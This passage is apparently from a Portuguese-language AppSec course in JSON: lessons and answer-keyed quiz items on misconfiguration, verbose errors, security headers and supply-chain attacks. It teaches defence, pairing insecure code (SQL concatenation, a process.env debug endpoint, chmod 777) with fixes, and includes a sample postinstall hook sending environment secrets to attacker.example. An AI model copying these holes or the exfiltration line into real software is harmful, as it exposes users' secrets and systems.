                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Um ajuste de segurança errado, ausente ou no padrão inseguro de fábrica.",
                                "isCorrect": true
                            },
                            {
                                "text": "Um bug de lógica de negócio, escrito pelo próprio time dentro do código.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma falha só de criptografia, quando o algoritmo escolhido é fraco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um ataque que injeta comandos SQL direto no formulário de login do sistema.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que contas e senhas padrão (como admin/admin) são um risco clássico de configuração incorreta?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Porque são credenciais públicas, testadas em massa por atacantes na internet.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque senhas curtas caem fácil em ataque de força bruta, mesmo sendo admin/admin.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o navegador grava esse tipo de senha em texto puro no histórico.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque contas padrão consomem memória extra do servidor no login.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma equipe sobe para produção uma app cujo arquivo versionado no Git traz SESSION_SECRET = 'changeme' como valor padrão, usado quando a variável de ambiente não está definida. Qual é o problema principal?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "É público no repositório e tende a repetir em produção, dá pra forjar sessão.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: um valor padrão desse tipo nunca chega a ser usado em produção real.",
                                "isCorrect": false
                            },
                            {
                                "text": "É só estético: o nome da variável devia estar escrito em português, não inglês.",
                                "isCorrect": false
                            },
                            {
                                "text": "É performance: ler variável de ambiente em cada requisição deixa tudo mais lento.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Ao investigar um incidente, você descobre que o modo de depuração do framework está ligado em produção, exibindo páginas de erro detalhadas e um console interativo. Como classificar e tratar isso?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Configuração incorreta de ambiente: a correção é desligar o debug em produção.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falha de criptografia: o certificado TLS do site precisa ser trocado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não é risco de segurança, é só um detalhe estético da página de erro.",
                                "isCorrect": false
                            },
                            {
                                "text": "É injeção de SQL: o certo aqui é parametrizar todas as consultas ao banco.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um serviço inicializa assim (pseudocódigo): se não existir usuário, cria admin com senha 'admin'; e usa JWT_SECRET = process.env.JWT_SECRET || 'dev-secret'. Qual mudança remedia melhor a configuração incorreta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Exigir senha forte no primeiro acesso e abortar o boot se faltar JWT_SECRET.",
                                "isCorrect": true
                            },
                            {
                                "text": "Trocar a senha padrão de 'admin' para 'admin123' e manter o fallback do segredo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Mover o usuário admin para outra tabela do banco, mantendo a senha 'admin'.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ofuscar o valor 'dev-secret' em base64 direto no código-fonte.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Erros que falam demais, portas abertas e diretórios à mostra",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Erros que falam demais, portas abertas e diretórios à mostra\n\nUm sistema seguro precisa ser **discreto**. Boa parte de um ataque é **reconhecimento**: descobrir versões, caminhos de arquivos, nomes de tabelas, qual banco roda por trás. Quanto mais o seu sistema conta sozinho, menos trabalho o atacante tem.\n\nO vazamento mais comum vem das **mensagens de erro verbosas**. Quando algo quebra, muitos apps devolvem ao cliente a **stack trace** completa e a mensagem crua do banco. Para o usuário legítimo isso é inútil; para o atacante é um mapa. Uma mensagem como 'coluna senha_hash da tabela usuarios' entrega o esquema do banco de graça, e a stack revela a versão do framework e o caminho absoluto dos arquivos no servidor.\n\nCompare os dois trechos abaixo. O primeiro é generoso com o atacante; o segundo mostra o mínimo para fora e guarda o detalhe onde ele deve ficar: no **log do servidor**."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: vaza detalhes internos para o cliente\napp.get(\"/pedidos/:id\", async (req, res) => {\n  try {\n    const pedido = await db.query(\n      \"SELECT * FROM pedidos WHERE id = \" + req.params.id\n    );\n    res.json(pedido);\n  } catch (err) {\n    // devolve a mensagem crua do banco e a stack trace inteira\n    res.status(500).json({ error: err.message, stack: err.stack });\n  }\n});\n\n// Endpoint de \"debug\" esquecido no ar, despejando o ambiente\napp.get(\"/debug/env\", (req, res) => res.json(process.env));"
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: mensagem generica para fora, detalhe so no log\napp.get(\"/pedidos/:id\", async (req, res, next) => {\n  try {\n    const pedido = await db.query(\n      \"SELECT * FROM pedidos WHERE id = $1\",\n      [req.params.id]\n    );\n    res.json(pedido);\n  } catch (err) {\n    next(err); // delega ao handler central de erros\n  }\n});\n\n// Handler central: registra o detalhe, responde o minimo\napp.use((err, req, res, next) => {\n  const id = gerarIdCorrelacao();\n  logger.error({ id, msg: err.message, stack: err.stack }); // fica no servidor\n  res.status(500).json({ error: \"Erro interno\", id });      // cliente ve so isto\n});\n\napp.disable(\"x-powered-by\"); // nao anuncia o framework nos cabecalhos\n// e nenhum endpoint /debug/* vai para producao"
                    },
                    {
                        "type": "text",
                        "value": "## Diretórios à mostra, serviços expostos e permissões demais\n\nOutras três formas de configuração incorreta expõem o sistema sem precisar de nenhum bug:\n\n- **Diretórios listáveis**: quando o servidor web lista o conteúdo das pastas (o famoso 'autoindex') e serve o **projeto inteiro**, qualquer um navega pelo browser e encontra o que não deveria ser público: **.env** com segredos, a pasta **.git** com todo o histórico, backups, arquivos de configuração.\n- **Serviços e portas expostos**: subir um banco de dados publicado na internet (**0.0.0.0:5432**), deixar um painel administrativo ou um endpoint de métricas/health aberto ao mundo. Cada serviço acessível é uma porta a mais para tentar arrombar. A regra é **minimizar a superfície**: só fica exposto o que precisa estar.\n- **Permissões excessivas**: a aplicação que se conecta ao banco como **superusuário**, arquivos com **chmod 777**, um container rodando como **root**, uma política de nuvem com curinga em tudo. O problema não é só o exagero: é que, no dia em que a app for comprometida, o atacante herda **todo** esse poder. O antídoto é o **princípio do menor privilégio**: cada componente recebe só o acesso de que precisa, e nada além.\n\n**Em resumo:** não deixe o sistema falar demais nem carregar mais poder do que o necessário. O próximo trecho mostra o par inseguro x seguro dessas três configurações."
                    },
                    {
                        "type": "code",
                        "value": "# ===================== INSEGURO =====================\n\n# nginx: lista diretorios e serve o repositorio inteiro\nserver {\n  location / {\n    root /var/www/projeto;   # projeto completo: .env, .git, backups...\n    autoindex on;            # permite navegar pastas pelo browser\n  }\n}\n\n# docker-compose: banco publicado para a internet\nservices:\n  db:\n    image: postgres:16\n    ports:\n      - \"5432:5432\"          # exposto em 0.0.0.0:5432 no host\n\n# permissoes: tudo liberado\nchmod -R 777 /var/www/projeto\n# a app conecta no banco como superusuario \"postgres\"\n\n# ====================== SEGURO ======================\n\n# nginx: apenas a pasta publica de build, sem listagem\nserver {\n  location / {\n    root /var/www/projeto/dist;  # so o build publico\n    autoindex off;               # padrao: nao lista diretorios\n    index index.html;\n  }\n}\n\n# docker-compose: banco so na rede interna (sem publicar no host)\nservices:\n  db:\n    image: postgres:16\n    expose:\n      - \"5432\"               # acessivel apenas por outros containers\n\n# permissoes minimas e usuario dedicado no banco\nchmod -R 750 /var/www/projeto/dist\n-- menor privilegio: role da app so com o necessario\nCREATE ROLE app LOGIN PASSWORD :senha;\nGRANT SELECT, INSERT, UPDATE, DELETE ON pedidos TO app;\n-- sem SUPERUSER, sem DROP, sem acesso a outras tabelas"
                    },
                    {
                        "type": "quote",
                        "value": "Menos é mais em segurança de configuração: **mostre o mínimo** nas mensagens de erro, **exponha o mínimo** de serviços e portas, e **conceda o mínimo** de privilégio a cada peça. Detalhe de erro vai para o log do servidor, não para o cliente."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que devolver a stack trace completa e a mensagem crua do banco direto para o cliente é perigoso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Porque vaza dado útil pro reconhecimento: caminho, versão e estrutura de tabela.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque stack trace deixa a resposta HTTP visivelmente mais lenta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o navegador do cliente não consegue renderizar um texto tão longo assim.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não é perigoso: quanto mais detalhe o usuário final vê, melhor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um servidor web com listagem de diretórios ligada, servindo a pasta raiz do projeto, expõe principalmente o quê?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Arquivo que devia ser privado: .env, .git, backup e código-fonte à mostra.",
                                "isCorrect": true
                            },
                            {
                                "text": "Só imagens já otimizadas que compõem o layout da página pública.",
                                "isCorrect": false
                            },
                            {
                                "text": "Somente os cabeçalhos HTTP devolvidos junto com cada resposta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nada relevante: listagem de diretório é sempre um recurso inofensivo.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Sua API responde 500 com um JSON contendo err.stack em produção. Qual é a correção adequada?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Mensagem genérica com id de correlação, detalhe só no log do servidor.",
                                "isCorrect": true
                            },
                            {
                                "text": "Trocar o status 500 por 200 na resposta e continuar enviando a stack.",
                                "isCorrect": false
                            },
                            {
                                "text": "Comprimir a resposta com gzip, isso já esconde a stack trace do cliente final.",
                                "isCorrect": false
                            },
                            {
                                "text": "Enviar a stack só quando o User-Agent identificar um navegador comum.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O PostgreSQL está publicado em 0.0.0.0:5432 (acessível pela internet) e a aplicação se conecta como superusuário. Qual conjunto de medidas segue o menor privilégio e reduz a exposição?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Banco restrito à rede interna, usuário só com os grants necessários.",
                                "isCorrect": true
                            },
                            {
                                "text": "Manter a porta aberta ao público, só trocar a senha do superusuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Mover o banco para a porta 5433, isso já esconde o serviço na internet.",
                                "isCorrect": false
                            },
                            {
                                "text": "Dar privilégio de superusuário à app para não ter erro de permissão.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um bloco do nginx traz: location / { root /var/www/projeto; autoindex on; }, e /var/www/projeto é o repositório completo. Quais problemas há e qual a melhor correção?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Lista diretório e serve o repo inteiro: desligar autoindex e servir só o build.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum problema: autoindex costuma melhorar o posicionamento em buscadores.",
                                "isCorrect": false
                            },
                            {
                                "text": "O único ajuste necessário é adicionar um index.html na raiz do projeto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Basta renomear o arquivo .env para .env.txt que o risco de exposição já desaparece.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Cabeçalhos de segurança que não podem faltar",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Cabeçalhos de segurança que não podem faltar\n\nAlguns dos controles mais baratos e eficazes de AppSec não estão no seu código de negócio: são **cabeçalhos de resposta HTTP**. Você os envia junto com a página, e é o **navegador** que os aplica, reforçando a segurança do lado do cliente. Não enviá-los é, por si só, uma configuração incorreta (A02).\n\nSão declarativos e de custo quase zero: uma linha de configuração ativa uma proteção que o navegador passa a impor. O problema é que, por padrão, muitos frameworks **não enviam nenhum deles** — e o que não é ativado, não protege.\n\nA tabela a seguir reúne os principais. Depois vamos aos mais importantes um a um."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Cabeçalho\",\"O que faz\",\"Exemplo de valor\"],[\"Strict-Transport-Security (HSTS)\",\"Força o navegador a usar HTTPS por um período\",\"max-age=63072000; includeSubDomains; preload\"],[\"X-Content-Type-Options\",\"Impede o navegador de 'adivinhar' o tipo (MIME sniffing)\",\"nosniff\"],[\"X-Frame-Options\",\"Bloqueia enquadramento em iframe (clickjacking)\",\"DENY\"],[\"Content-Security-Policy (CSP)\",\"Restringe de onde vêm scripts/estilos (anti-XSS)\",\"default-src 'self'\"],[\"Referrer-Policy\",\"Controla o Referer enviado, evita vazar URLs\",\"strict-origin-when-cross-origin\"],[\"Permissions-Policy\",\"Limita recursos do navegador (câmera, geoloc.)\",\"geolocation=(), camera=()\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Os principais, um a um\n\n- **HSTS (Strict-Transport-Security)**: diz ao navegador para acessar o site **somente via HTTPS** por um tempo (o max-age). Isso frustra o ataque de **downgrade** (SSL strip), em que alguém na rede tenta rebaixar a conexão para HTTP e interceptar os dados. O **includeSubDomains** estende a regra aos subdomínios; o **preload** ajuda até na primeira visita.\n- **X-Content-Type-Options: nosniff**: obriga o navegador a **respeitar o Content-Type declarado** em vez de tentar adivinhá-lo. Sem isso, um arquivo enviado por um usuário pode acabar interpretado como script.\n- **X-Frame-Options: DENY** (ou o CSP **frame-ancestors 'none'**): impede que sua página seja carregada dentro de um **iframe** de outro site, fechando a porta para **clickjacking**, aquele golpe em que a vítima clica achando que está em outro lugar.\n- **CSP (Content-Security-Policy)**: restringe as origens de scripts, estilos e outros recursos. É uma defesa em profundidade poderosa contra **XSS** e merece um estudo à parte (feito no módulo de Injeção).\n- **Referrer-Policy**: controla quanto da URL vaza no cabeçalho Referer ao clicar num link, evitando expor caminhos ou tokens.\n\nUm aviso: o antigo **X-XSS-Protection** é **legado** e foi abandonado pelos navegadores modernos. Não confie nele; a proteção real contra XSS vem de output encoding e CSP."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: nenhum cabecalho de seguranca, cookie sem flags\nconst app = express();\n\napp.get(\"/\", (req, res) => {\n  res.cookie(\"session\", token);   // sem HttpOnly, Secure ou SameSite\n  res.send(pagina);\n});\n\n// Sem HSTS, sem nosniff, sem protecao contra clickjacking.\n// Pior: o Express ainda anuncia \"X-Powered-By: Express\"."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: baseline de cabecalhos com helmet + cookie endurecido\nimport helmet from \"helmet\";\n\n// helmet ativa um bom conjunto padrao: nosniff, X-Frame-Options,\n// HSTS, uma CSP padrao, e remove o X-Powered-By.\napp.use(helmet());\n\n// Ajuste fino do HSTS (cabecalho Strict-Transport-Security)\napp.use(helmet.hsts({ maxAge: 63072000, includeSubDomains: true, preload: true }));\n\napp.get(\"/\", (req, res) => {\n  res.cookie(\"session\", token, {\n    httpOnly: true,   // o JavaScript da pagina nao le o cookie (mitiga XSS)\n    secure: true,     // so trafega em HTTPS\n    sameSite: \"lax\",  // mitiga CSRF\n  });\n  res.send(pagina);\n});\n\n// Equivalente manual (sem helmet):\n// res.setHeader(\"Strict-Transport-Security\", \"max-age=63072000; includeSubDomains; preload\");\n// res.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n// res.setHeader(\"X-Frame-Options\", \"DENY\");"
                    },
                    {
                        "type": "quote",
                        "value": "Cabeçalhos de segurança são proteção **barata e de alto impacto**: uma linha de configuração e o navegador passa a trabalhar a seu favor. Defina um **baseline seguro** (na prática, comece com o **helmet** no Node), endureça os cookies com **HttpOnly**, **Secure** e **SameSite**, e valide o resultado com um scanner de cabeçalhos."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que o cabeçalho Strict-Transport-Security (HSTS) faz?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Instrui o navegador a usar HTTPS por um tempo, dificultando o downgrade.",
                                "isCorrect": true
                            },
                            {
                                "text": "Criptografa o conteúdo do banco de dados direto no servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Bloqueia todo carregamento de imagem hospedada em outro domínio.",
                                "isCorrect": false
                            },
                            {
                                "text": "Impede que o navegador ofereça salvar a senha digitada pelo usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve o cabeçalho X-Content-Type-Options: nosniff?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Faz o navegador respeitar o Content-Type declarado, sem tentar adivinhar.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ativa a compressão automática para toda resposta enviada pelo servidor web.",
                                "isCorrect": false
                            },
                            {
                                "text": "Define por quanto tempo o navegador guarda a resposta em cache.",
                                "isCorrect": false
                            },
                            {
                                "text": "Assina digitalmente cada resposta HTTP enviada para o cliente.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um site serve tudo por HTTPS, mas não envia HSTS. Qual risco continua aberto?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Um atacante na rede ainda pode rebaixar a conexão pra HTTP e interceptar dado.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: usar HTTPS por padrão já torna o cabeçalho HSTS irrelevante.",
                                "isCorrect": false
                            },
                            {
                                "text": "O certificado TLS do site deixa de ser considerado válido sem o HSTS ativo.",
                                "isCorrect": false
                            },
                            {
                                "text": "As imagens hospedadas no site param de carregar direito no navegador do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Descobriram que sua aplicação pode ser embutida em um iframe em sites de terceiros, permitindo clickjacking. Qual configuração resolve?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Enviar X-Frame-Options: DENY pra impedir que a página seja enquadrada por outros.",
                                "isCorrect": true
                            },
                            {
                                "text": "Adicionar o cabeçalho X-Content-Type-Options: nosniff nas respostas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Definir Cache-Control: no-store em todas as rotas sensíveis da aplicação inteira.",
                                "isCorrect": false
                            },
                            {
                                "text": "Remover de vez o cabeçalho Referrer-Policy de todas as respostas HTTP do servidor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma aplicação define o cookie de sessão como: Set-Cookie: session=abc123. O site usa HTTPS e há risco de XSS. Qual versão endurece melhor o cookie?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "session=abc123; HttpOnly; Secure; SameSite=Lax, as três defesas juntas.",
                                "isCorrect": true
                            },
                            {
                                "text": "session=abc123; Secure, essa única flag isolada já basta pra cobrir tudo o risco.",
                                "isCorrect": false
                            },
                            {
                                "text": "session=abc123; HttpOnly=false; Secure=false, cookie mais simples.",
                                "isCorrect": false
                            },
                            {
                                "text": "session=abc123; Max-Age=999999999, aumentar a validade resolve.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "A03: da 'biblioteca desatualizada' à cadeia de suprimentos",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# A03: da 'biblioteca desatualizada' à cadeia de suprimentos\n\nAgora a segunda metade do módulo: a **A03 - Falhas na cadeia de suprimentos de software**. Vale começar pela história, porque ela explica muita coisa. Na edição de 2021 essa categoria se chamava **'Componentes vulneráveis e desatualizados'** e tratava, essencialmente, de uma pergunta: 'você está usando uma biblioteca velha com falha conhecida?'.\n\nEm 2025 ela foi **ampliada, renomeada para 'Falhas na cadeia de suprimentos de software' e subiu para A03**. A mudança de nome não é cosmética. Reconhece uma realidade: hoje a maior parte de qualquer aplicação **não é código seu** — são dependências de terceiros, ferramentas de build, imagens base de container, ações de CI/CD, pacotes vindos de registros públicos. Toda essa **cadeia** é superfície de ataque, não só a idade das suas libs.\n\nÉ por isso que a categoria virou destaque: quando você roda um simples install, herda a confiança em **todo mundo** que produziu aquele código e a infraestrutura que o entregou. Um elo fraco em qualquer ponto da cadeia vira problema seu."
                    },
                    {
                        "type": "quote",
                        "value": "**A03 é a evolução direta de 'componentes vulneráveis e desatualizados'.** O foco deixou de ser apenas 'minha lib está velha?' e passou a ser 'posso confiar em toda a cadeia que produz e entrega o código que roda no meu app?' — dependências, transitivas, build, CI/CD e registros."
                    },
                    {
                        "type": "text",
                        "value": "## Como isso entra no seu app\n\nO caminho mais comum são as **dependências**. E aqui mora a parte que surpreende: além das que você declara (as **diretas**), vêm as **transitivas** — as dependências das suas dependências. Você instala meia dúzia de pacotes e, sem perceber, traz **centenas** de outros que nunca escolheu. Uma vulnerabilidade lá no fundo dessa árvore é, ainda assim, uma vulnerabilidade **sua**.\n\nDois hábitos de gestão reduzem muito o risco:\n\n- **Lockfile versionado**: o **package-lock.json** (ou yarn.lock) registra as versões **exatas** de toda a árvore resolvida, com hashes de integridade. Commitar esse arquivo garante que todo ambiente instale exatamente o mesmo conjunto.\n- **Instalar do lockfile no CI**: use **npm ci** (e não **npm install**) no pipeline. Ele instala estritamente o que está travado e **falha** se algo divergir, em vez de resolver versões novas silenciosamente a cada build.\n\nRepare, no par abaixo, como faixas do tipo **^4.18.0** deixam o build livre para puxar qualquer 4.x mais nova — o lockfile é o que dá previsibilidade a isso."
                    },
                    {
                        "type": "code",
                        "value": "// package.json (INSEGURO)\n{\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",   // ^ aceita qualquer 4.x >= 4.18\n    \"left-pad\": \"^1.0.0\"\n  }\n}\n\n# CI resolve versoes novas a cada build, sem travar\nnpm install\n# lockfile NAO versionado -> cada ambiente pode ter versoes diferentes\n# e nenhuma varredura de vulnerabilidade roda no pipeline\n\n\n// package.json (SEGURO) - mesmas faixas, mas com disciplina de cadeia\n{\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",\n    \"left-pad\": \"^1.0.0\"\n  }\n}\n\n# CI instala EXATAMENTE o que esta no package-lock.json (versoes + hashes)\nnpm ci\n# quebra o build se houver vulnerabilidade de severidade alta ou maior\nnpm audit --audit-level=high"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Prática\",\"O que resolve\",\"Exemplo de ferramenta\"],[\"Lockfile versionado\",\"Instalações reproduzíveis; trava versões e hashes\",\"package-lock.json, yarn.lock\"],[\"npm ci no CI\",\"Instala do lockfile e falha em divergência\",\"npm ci\"],[\"Atualização contínua\",\"Reduz a janela usando libs com falha conhecida\",\"Dependabot, Renovate\"],[\"Varredura (SCA)\",\"Cruza suas dependências com bases de vulnerabilidades\",\"npm audit, Snyk, OWASP Dependency-Check, Trivy\"],[\"SBOM\",\"Inventário do que você usa (para responder rápido)\",\"CycloneDX, SPDX\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## SBOM: saber o que você tem para responder rápido\n\nQuando uma vulnerabilidade crítica é divulgada numa biblioteca muito usada, a corrida é para responder três perguntas: **eu uso isso? em quais serviços? em qual versão?**. Quem não tem inventário passa dias caçando; quem tem responde em minutos.\n\nEsse inventário é o **SBOM (Software Bill of Materials)** — uma lista de materiais do software, com todos os componentes e versões que compõem cada entrega. Formatos como **CycloneDX** e **SPDX** o tornam legível por máquina. Combinado com **varredura de dependências (SCA)** rodando no CI, ele transforma a gestão de cadeia de reativa em contínua.\n\n**Recapitulando:** a A03 é a evolução de 'componentes vulneráveis' para a **cadeia inteira**. A base defensiva é: **lockfile** versionado, **npm ci** no pipeline, **atualização** frequente, **varredura (SCA)** automatizada e um **SBOM** para saber sempre o que você está rodando."
                    }
                ],
                "questions": [
                    {
                        "statement": "A categoria A03:2025 (Falhas na cadeia de suprimentos de software) é a evolução de qual categoria de 2021?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "'Componentes vulneráveis e desatualizados', ampliada pra cobrir toda a cadeia.",
                                "isCorrect": true
                            },
                            {
                                "text": "'Injeção', categoria que passou a incluir também os ataques de XSS refletido.",
                                "isCorrect": false
                            },
                            {
                                "text": "'Controle de acesso quebrado', que teria subido pro topo do ranking em 2025.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma categoria totalmente nova, sem nenhuma relação com edição anterior do OWASP.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que é uma dependência transitiva?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Dependência das suas dependências, que entra sem você declarar direto.",
                                "isCorrect": true
                            },
                            {
                                "text": "Uma dependência que só existe durante a execução da suíte de testes automatizados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma dependência instalada na mão, fora do gerenciador de pacotes.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma lib escrita por você mesmo e publicada no registro público.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "No pipeline, o build roda 'npm install' e o package-lock.json não é versionado; ambientes acabam com versões diferentes das mesmas libs. Qual é a melhor correção?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Versionar o lockfile e trocar pra 'npm ci', que trava as versões exatas.",
                                "isCorrect": true
                            },
                            {
                                "text": "Fixar todas as versões agora mesmo e nunca mais atualizar nenhuma delas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Trocar o comando 'npm install' por 'npm update' logo na etapa de build.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apagar o lockfile em toda máquina do time pra forçar uma resolução nova.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Uma vulnerabilidade crítica acaba de ser divulgada em uma biblioteca muito usada. O que permite responder rapidamente 'eu uso isso? em quais serviços? em qual versão?'?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Inventário de componentes (SBOM) mais varredura (SCA) contra base de falha.",
                                "isCorrect": true
                            },
                            {
                                "text": "Esperar o próximo pentest anual da empresa pra só então ir descobrir isso.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ler manualmente o código-fonte de cada lib a cada nova versão publicada.",
                                "isCorrect": false
                            },
                            {
                                "text": "Confiar que, se algo estiver quebrado, algum usuário acaba reclamando logo.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Sobre gerenciar o risco de dependências, qual afirmação é correta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Falha em dependência transitiva também é sua; lockfile, 'npm ci' e SCA ajudam.",
                                "isCorrect": true
                            },
                            {
                                "text": "Se a dependência direta está em dia, a transitiva deixa de importar.",
                                "isCorrect": false
                            },
                            {
                                "text": "Rodar SCA uma única vez, lá na criação do projeto, já resolve pra sempre.",
                                "isCorrect": false
                            },
                            {
                                "text": "Lockfile e SCA são a mesma ferramenta, fazem exatamente o mesmo papel.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Pacotes maliciosos e integridade de artefatos",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Pacotes maliciosos e integridade de artefatos\n\nAté aqui a A03 tratou de dependências **bem-intencionadas mas com falhas**. Existe um lado mais sombrio: código **deliberadamente malicioso** entrando pela cadeia. Para o atacante, muitas vezes é mais barato **envenenar o poço** — publicar ou comprometer um pacote que milhares de projetos vão baixar — do que atacar cada alvo um a um.\n\nEssa é a diferença entre 'a lib tem um bug' e 'a lib é o ataque'. E, como ela entra pelo caminho de confiança do seu gerenciador de pacotes, costuma passar despercebida."
                    },
                    {
                        "type": "text",
                        "value": "## Typosquatting, confusão de dependências e scripts de instalação\n\nAs táticas mais comuns:\n\n- **Typosquatting**: publicar um pacote com nome **quase igual** ao de um popular (um erro de digitação provável) na esperança de que alguém o instale por engano. Um caractere trocado e você trouxe código do atacante.\n- **Confusão de dependências (dependency confusion)**: sua empresa usa um pacote **interno** por um nome simples; o atacante publica um pacote com **o mesmo nome** no registro **público**, com uma versão altíssima. Um resolvedor mal configurado prefere a versão pública 'mais nova' e baixa o código malicioso.\n- **Mantenedor comprometido**: a conta de quem publica um pacote legítimo é sequestrada, e uma **atualização** maliciosa é lançada. Você atualiza de boa-fé e importa o problema.\n- **Scripts de instalação**: pacotes podem definir hooks como **postinstall**, que rodam **código automaticamente** durante a instalação — antes mesmo de você usar a biblioteca. É o ponto perfeito para exfiltrar variáveis de ambiente e tokens do seu CI.\n\nO trecho abaixo junta duas dessas armadilhas: um nome com typo e um postinstall que rouba segredos."
                    },
                    {
                        "type": "code",
                        "value": "// package.json (INSEGURO): nome com typo + script na instalacao\n{\n  \"dependencies\": {\n    \"reqeusts\": \"1.0.0\"   // parece \"requests\"/\"request\", mas NAO e\n  },\n  \"scripts\": {\n    // roda automaticamente no \"npm install\", sem voce chamar nada\n    \"postinstall\": \"node ./scripts/coleta.js\"\n  }\n}\n\n// coleta.js poderia simplesmente fazer:\n//   fetch(\"https://attacker.example/x\", {\n//     method: \"POST\",\n//     body: JSON.stringify(process.env)   // exfiltra segredos e tokens\n//   });"
                    },
                    {
                        "type": "text",
                        "value": "## Integridade de artefatos: confiar, mas verificar\n\nSe você vai depender de código de terceiros, precisa garantir que o artefato que chega é **exatamente** o esperado — e não uma versão adulterada. Isso é **integridade de artefatos**, e há várias camadas:\n\n- **Hashes de integridade no lockfile**: o package-lock.json guarda um hash (sha512) de cada pacote. Ao instalar com **npm ci**, o gerenciador **recalcula e compara**; se o conteúdo baixado não bater, a instalação **falha**. É a sua defesa contra o pacote ter sido trocado no meio do caminho.\n- **Escopo + registro privado**: pacotes com **escopo** (por exemplo, @acme/utils) apontando o escopo para um registro interno fecham a porta da confusão de dependências.\n- **Desabilitar scripts quando possível**: instalar com **--ignore-scripts** evita a execução automática de hooks de pacotes desconhecidos.\n- **Proveniência e assinatura**: publicar com **proveniência** (atestando de qual repositório e build o pacote saiu) e verificar assinaturas aumenta a confiança na origem.\n- **Higiene geral**: revisar dependências novas, preferir pacotes com boa reputação e manutenção ativa, e manter o número de dependências **enxuto**.\n\nO par a seguir mostra a configuração defensiva na prática."
                    },
                    {
                        "type": "code",
